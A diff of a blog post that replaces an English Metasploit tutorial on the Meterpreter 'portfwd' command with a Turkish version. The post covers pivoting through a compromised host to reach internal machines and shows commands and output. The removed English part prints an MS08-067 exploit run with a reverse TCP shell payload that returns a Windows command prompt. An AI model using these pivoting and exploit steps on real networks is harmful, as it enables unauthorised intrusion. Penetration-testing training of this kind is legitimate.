@@ -5,7 +5,7 @@ date: 2017-05-25 09:08:06.000000000 +02:00
 type: post
 author: siberoloji
 img: metasploit.jpg
-published: false
+published: true
 status: publish
 categories:
 - Nasıl
@@ -13,28 +13,29 @@ categories:
 tags:
 - msfconsole
 - metasploit Framework
-- Metasploit Framework client exploit
-- msf client side exploit
-excerpt: Bu yazımızda, Metasplot Framework kullanarak İstemci tarafı exploit olarak
-  bir PDF dosyası oluşturmayı göreceğiz. Oluşturulan PDF, görünürde zararsız olsa
-  da içerisine zararlı kodlar gömülebilir.
+- Metasploit Framework portfwd
+- msf meterpreter portfwd
+
+excerpt: Port Yönlendirme olarak kullanılan ```portfwd``` komutu, Meterpreter'in sağladığı imkanlardan bir tanesidir. Normalde ağda bulunan fakat doğrudan iletişim kurulamayan cihazlarla iletişim kurmaya yarar. Bunun gerçekleşebilmesi için öncelikle bir **pivot** bilgisayara ihtiyacımız bulunmaktadır.
 ---
 
-Portfwd
-The portfwd command from within the Meterpreter shell is most commonly used as a pivoting technique, allowing direct access to machines otherwise inaccessible from the attacking system. Running this command on a compromised host with access to both the attacker and destination network (or system), we can essentially forward TCP connections through this machine, effectively making it a pivot point. Much like the port forwarding technique used with an ssh connection, portfwd will relay TCP connections to and from the connected machines.
+# Portfwd
 
-Contents
+Port Yönlendirme olarak kullanılan ```portfwd``` komutu, Meterpreter'in sağladığı imkanlardan bir tanesidir. Normalde ağda bulunan fakat doğrudan iletişim kurulamayan cihazlarla iletişim kurmaya yarar. Bunun gerçekleşebilmesi için öncelikle bir **pivot** bilgisayara ihtiyacımız bulunmaktadır.
 
-1 Help
-2 Options
-3 Arguments
-4 Syntax
-4.1 Add
-4.1.1 Delete
-Help
+Pivot olarak adlandırdığımız bilgisayarın bağlanabildiği bir ağ cihazına, port yönlendirme yaparak kendi yerel makinemizden bağlanmamızı sağlar. Bunun nasıl gerçekleştiğini bir örnekle açıklamaya çalışalım. Bu anlatımda 3 adet bilgisayar olduğunu baştan belirtmekte fayda var. 
 
-From an active Meterpreter session, typing portfwd –h will display the command’s various options and arguments.
+1. Kendi bilgisayarımız: 192.168.1.162 veya 0.0.0.0
+2. Pivot bilgisayar    : 172.16.194.144
+3. Hedef Bilgisayar    : 172.16.194.191
 
+Bizim burada yapmaya çalıştığımız işlem, bir şekilde meterpreter oturum açtığımız **pivot** bilgisayar üzerinden Port Yönlendirme yaparak **hedef** bilgisayarla haberleşmeyi sağlamaktır.
+
+## Yardımı Görüntüleme
+
+Pivot makinede meterpreter oturum açık durumdayken ```portfwd –h``` komutu ile ```portfwd``` ile ilgili yardımı görüntüleyebilirsiniz.
+
+```sh
 meterpreter > portfwd -h
 Usage: portfwd [-h] [add | delete | list | flush] [args]
 OPTIONS:
@@ -44,51 +45,67 @@ OPTIONS:
      -p >opt>  The remote port to connect on.
      -r >opt>  The remote host to connect on.
 meterpreter >
-Figure 1 Help Banner
+```
 
-Options
+## Seçenekler
 
--L: Use to specify the listening host. Unless you need the forwarding to occur on a specific network adapter you can omit this option.If none is entered 0.0.0.0 will be used.
--h: Displays the above information.
--l: This is a local port which will listen on the attacking machine.Connections to this port will be forwarded to the remote system.
--p: The port to which TCP connections will be forward to.
--r: The IP address the connections are relayed to (target).
-Arguments
+-L: Dinleme yapacağımız kendi bilgisayarımızın IP adresini ifade eder. Bilgisayarınızda birden fazla ağ kartı yoksa bu seçeneği girmeyebilirsiniz. Varsayılan olarak ```localhost``` anlamında ```0.0.0.0``` kullanılacaktır.
 
-Add: This argument is used to create the forwarding.
-Delete: This will delete a previous entry from our list of forwarded ports.
-List: This will list all ports currently forwarded.
-Flush: This will delete all ports from our forwarding list.
-Syntax
+-h: Yardım bilgisini görüntüler.
 
-Add
+-l: Yerel kendi bilgisayarımızda dinleme yapacağımız Port numarasını ifade eder. 
 
-From the Meterpreter shell, the command is used in the following manner:
+-p: Hedef bilgisayarın Port numarasını ifade eder.
 
+-r: Hedef bilgisayarın IP adresini ifade eder. 
+
+## Argümanlar
+
+Add: Yeni bir yönlendirme eklemeye yarar.
+
+Delete: Mevcut bir yönlendirmeyi silmeye yarar.
+
+List: Mevcut durumda tüm yönlendirmelerin listesini görüntülemeye yarar.
+
+Flush: Tüm aktif yönlendirmeleri iptal etmeye yarar.
+
+## Yönlendirme Ekleme
+
+Meterpreter shell oturumunu açtığımız **pivot** bilgisayarda iken vereceğimiz komut aşağıdaki formattadır. 
+
+```sh
 meterpreter > portfwd add –l 3389 –p 3389 –r  [target host]
-add will add the port forwarding to the list and will essentially create a tunnel for us. Please note, this tunnel will also exist outside the Metasploit console, making it available to any terminal session.
--l 3389 is the local port that will be listening and forwarded to our target. This can be any port on your machine, as long as it’s not already being used.
--p 3389 is the destination port on our targeting host.
--r [target host] is the our targeted system’s IP or hostname.
+```
+
+```-l 3389``` Yerel bilgisayarımızda dinleme yapacağımız Port numarası
+
+```-p 3389``` Hedef bilgisayar Port numarasıdır.
+
+```-r [target host]``` hedef bilgisayar IP adresidir.
+
+Şimdi port yönlendirmeyi yapalım.
+
+```sh
 meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.191
 [*] Local TCP relay created: 0.0.0.0:3389 >-> 172.16.194.191:3389
 meterpreter > 
-Figure 2 Adding a port
+```
 
-Delete
+## Yönlendirme Silme
 
-Entries are deleted very much like the previous command. Once again from an active Meterpreter session, we would type the following:
+Silme işlemini de **pivot** bilgisayar oturumunda iken aşağıdaki örnekte olduğu gibi yapabiliriz.
 
-meterpreter > portfwd delete –l 3389 –p 3389 –r [target host]
+```sh
 meterpreter > portfwd delete –l 3389 –p 3389 –r 172.16.194.191
 [*] Successfully stopped TCP relay on 0.0.0.0:3389
 meterpreter > 
-Figure 3 Deleting a port
+```
 
-LIST:
-This argument needs no options and provides us with a list of currently listening and forwarded ports.
+## Yönlendirmeleri Listeleme
 
-meterpreter > portfwd list
+Aktif olan yönlendirmeleri ``` portfwd list``` komutuyla yapabiliriz.
+
+```sh
 meterpreter > portfwd list
 0: 0.0.0.0:3389 -> 172.16.194.191:3389
 1: 0.0.0.0:1337 -> 172.16.194.191:1337
@@ -96,13 +113,13 @@ meterpreter > portfwd list
 
 3 total local port forwards.
 meterpreter >
+```
 
-Figure 4 List command
+## Tüm Yönlendirmeleri Temizleme
 
-FLUSH:
-This argument will allow us to remove all the local port forward at once.
+Sistemde aktif olan tüm yönlendirmeleri ```portfwd flush``` komutuyla iptal edebiliriz.
 
-meterpreter > portfwd flush
+```sh
 meterpreter > portfwd flush
 [*] Successfully stopped TCP relay on 0.0.0.0:3389
 [*] Successfully stopped TCP relay on 0.0.0.0:1337
@@ -112,14 +129,17 @@ meterpreter > portfwd list
 
 0 total local port forwards
 meterpreter >
-Figure 5 Flush command
+```
 
-Example Usage:
+# Örnek
 
-In this example, we will open a port on our local machine and have our Meterpreter session forward a connection to our victim on that same port. We’ll be using port 3389, which is the Windows default port for Remote Desktop connections.
+Aşağıda örnek olarak bir senaryoyu bulabilirsiniz.
 
-Here are the players involved:
+## Hedef Bilgisayar
 
+Aşağıdaki komut çıktısında görüldüğü gibi, hedef bilgisayar ```172.16.194.141``` IP adresine sahiptir.
+
+```sh
 C:\> ipconfig
 
 Windows IP Configuration
@@ -132,8 +152,13 @@ Ethernet adapter Local Area Connection 3:
    Default Gateway. . .  .  .  .  .  . 172.16.194.2
 
 C:\>
-Figure 6 Victim machine
+```
 
+## Pivot Bilgisayar
+
+**Pivot** bilgisayar aşağıdaki çıktıda görüldüğü gibi, hem ```172.16.194.0/24``` ağına hem de ```192.168.1.0/24``` ağına bağlanabilmektedir. Bizim yerel bilgisayarımızda bu ```192.168.1.0/24``` ağında bulunuyor.
+
+```sh
 meterpreter > ipconfig
 
 MS TCP Loopback interface
@@ -141,21 +166,22 @@ Hardware MAC: 00:00:00:00:00:00
 IP Address  : 127.0.0.1
 Netmask     : 255.0.0.0
 
-
-
 VMware Accelerated AMD PCNet Adapter - Packet Scheduler Miniport
 Hardware MAC: 00:aa:00:aa:00:aa
 IP Address  : 172.16.194.144
 Netmask     : 255.0.0.0
 
-
-
 AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport
 Hardware MAC: 00:bb:00:bb:00:bb
 IP Address  : 192.168.1.191
 Netmask     : 255.0.0.0
-Figure 7 Our Pivot machine
+```
 
+## Yerel Bilgisayar
+
+Birazdan aşağıda göreceğiniz yönlendirme sonucunda yerel bilgisayarımızın (192.168.1.162 IP numaralı), **pivot** makine üzerinden ```172.16.194.141``` IP adresine ```ping``` sinyali gönderebildiğini görebiliyoruz.
+
+```sh
 root@kali:~# ifconfig eth1
 eth1     Link encap:Ethernet  HWaddr 0a:0b:0c:0d:0e:0f  
          inet addr:192.168.1.162  Bcast:192.168.1.255  Mask:255.255.255.0
@@ -166,6 +192,7 @@ eth1     Link encap:Ethernet  HWaddr 0a:0b:0c:0d:0e:0f
          collisions:0 txqueuelen:1000 
          RX bytes:318385612 (303.6 MiB)  TX bytes:133752114 (127.5 MiB)
          Interrupt:19 Base address:0x2000
+
 
 root@kali:~# ping 172.16.194.141
 PING 172.16.194.141 (172.16.194.141) 56(84) bytes of data.
@@ -178,13 +205,21 @@ PING 172.16.194.141 (172.16.194.141) 56(84) bytes of data.
 rtt min/avg/max/mdev = 117.759/159.378/240.587/57.430 ms
 
 root@kali:~#
-Figure 8 Attacker’s machine
+```
 
-First we setup the port forwarding on our pivot using the following command:
+Peki bu haberleşmeyi nasıl başardık?
 
+## Yönlendirme Yapalım
+
+**pivot** bilgisayarda açtığımız meterpreter shell içerisinde iken aşağıdaki yönlendirme işlemini gerçekleştirdik.
+
+```sh
 meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.141
-We verify that port 3389 is listening by issuing the netstat command from another terminal.
+```
 
+Yönlendirme komutunu **pivot** bilgisayarda verdikten sonra yerel bilgisayarımızda ```netstat -antp``` komutuyla bizim de dinlemeyi ```3389``` numaralı port üzerinden yaptığımızı kontrol edebilirsiniz. 
+
+```sh
 root@kali:~# netstat -antp
 Active Internet connections (servers and established)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
@@ -194,61 +229,14 @@ tcp        0      0 0.0.0.0:3389            0.0.0.0:*               LISTEN      
 .....
 tcp6       0      0 :::22                   :::*                    LISTEN      8397/sshd
 root@kali:~#
-Figure 9 Local machine’s listening ports
+```
 
-We can see 0.0.0.0 is listening on port 3389 as well as the connection to our pivot machine on port 4444.
+Bu durumda yerel bilgisayarımızdan hedef bilgisayara ```rdesktop``` uzak masaüstü bağlantısı açabilir veya diğer işlemleri yapabiliriz.
 
-From here, we can initiate a remote desktop connection to our local 3389 port. Which will be forwarded to our victim machine on the corresponding port.
+Örneğin ```exploit/windows/smb/ms08_067_netapi``` modülünü kullanabiliriz. Bu modüldeki değişkenleri, yönlendirme sonucu ulaştığımız hedef bilgisayarın IP adresi ve Port numarasını girerek kullanabiliriz.
 
-portfwd-rdesktop.png
-Figure 10 Remote Desktop connection using local port
+Konunun biraz kafa karıştırıcı olduğunu düşünebilirsiniz. Bir miktar deneme ve antrenman yapmanızı tavsiye ediyorum. 
 
-Another example of portfwd usage is using it to forward exploit modules such as “MS08-067”.
-Using the same technique as show previously, it’s just a matter of forwarding the correct ports for the
-desired exploit.
+Şöyle düşünün, hedef bilgisayara ulaşmak için **pivot** makineye meterpreter shell açıyoruz. **pivot** bilgisayarın haberleşebildiği diğer IP adresinde aktif bulunan (örneğin SAMBA, 445 portu) servise önce yönlendirme yapıyoruz. Ardından yerel bilgisayarımızdan hedef bilgisayara bağlanabiliyoruz.
 
-Here we forwarded port 445, which is the port associated with Windows Server Message Block (SMB).
-Configuring our module target host and port to our forwarded socket. The exploit is sent via our pivot to the victim machine.
-
-msf exploit(ms08_067_netapi) > show options
-
-Module options (exploit/windows/smb/ms08_067_netapi):
-
-   Name     Current Setting  Required  Description
-   ----     ---------------  --------  -----------
-   RHOST    127.0.0.1        yes       The target address
-   RPORT    445              yes       Set the SMB service port
-   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
-
-
-Payload options (windows/shell/reverse_tcp):
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   EXITFUNC  thread           yes       Exit technique (accepted: seh, thread, process, none)
-   LHOST     192.168.1.162    yes       The listen address
-   LPORT     4444             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Automatic Targeting
-
-
-msf exploit(ms08_067_netapi) > exploit
-
-[*] Started reverse handler on 192.168.1.162:4444 
-[*] Automatically detecting the target...
-[*] Fingerprint: Windows 2003 - Service Pack 2 - lang:Unknown
-[*] We could not detect the language pack, defaulting to English
-[*] Selected Target: Windows 2003 SP2 English (NX)
-[*] Attempting to trigger the vulnerability...
-[*] Sending stage (240 bytes) to 192.168.1.159
-[-] Exploit exception: Stream # is closed.
-
-Microsoft Windows [Version 5.2.3790]
-(C) Copyright 1985-2003 Microsoft Corp.
-
-C:\WINDOWS\system32>
+Doğru IP ve Port numaralarını yönlendirme yaptığınıza dikkat etmelisiniz.
